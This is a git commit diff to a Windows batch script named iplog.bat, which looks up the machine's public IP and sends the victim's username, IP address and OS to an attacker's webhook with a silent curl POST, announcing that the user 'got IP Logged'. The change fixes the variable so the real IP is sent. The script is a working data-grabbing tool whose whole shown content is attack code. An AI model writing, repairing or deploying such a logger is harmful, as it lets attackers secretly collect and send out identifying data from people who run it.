4177136b4f1166e0001cc0af3378e85516c3bc75
Dazd <87366355+Dazd-Pkz@users.noreply.github.com>
2023-01-16 08:27:25 +0100

    Update iplog.bat

--- iplog.bat
+++ iplog.bat
@@ -6,7 +6,7 @@ set webhook=[WEBHOOK HERE WITHOUT BRACKETS]
 curl ifconfig.co/>ip&cls&set/p ip=<ip
 
 :: CUSTOM MESSAGE
-set message=:warning: **%username% got IP Logged!** :warning:\n\n:man_pouting: **Username** : %username%\n:detective: **IP** : %ipv4%\n:window: **OS** : %os% 
+set message=:warning: **%username% got IP Logged!** :warning:\n\n:man_pouting: **Username** : %username%\n:detective: **IP** : %ip%\n:window: **OS** : %os% 
 
 :: SENDING THE MESSAGE
 curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %webhook%
